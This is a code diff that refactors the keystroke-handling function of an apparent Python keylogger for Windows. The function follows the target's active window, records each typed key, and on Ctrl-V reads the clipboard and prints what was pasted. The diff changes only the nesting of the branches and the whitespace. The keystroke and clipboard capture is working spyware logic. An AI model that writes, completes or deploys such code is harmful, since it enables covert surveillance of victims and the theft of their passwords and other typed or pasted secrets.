@@ -40,25 +40,23 @@ def get_current_process():
     
 def key_stroke(event):
     global current_window
-    
+
     # check if target changed windows
     if event.WindowName != current_window:
         current_window = event.WindowName
         get_current_process()
-        
+
     # if they pressed a standard key
     if 32 < event.Ascii < 127:
         print(chr(event.Ascii), end=" ")
+    elif event.Key == "V":
+        win32clipboard.OpenClipboard()
+        pasted_value = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
+        print(f"[PASTE] - {pasted_value}", end=" ")
     else:
-        # if [Ctrl-V] get the value on the clipboard
-        if event.Key == "V":
-            win32clipboard.OpenClipboard()
-            pasted_value = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            print(f"[PASTE] - {pasted_value}", end=" ")
-        else:
-            print(f"{event.Key}", end=" ")
-    
+        print(f"{event.Key}", end=" ")
+
     # pass execution to next hook registered
     return True
     
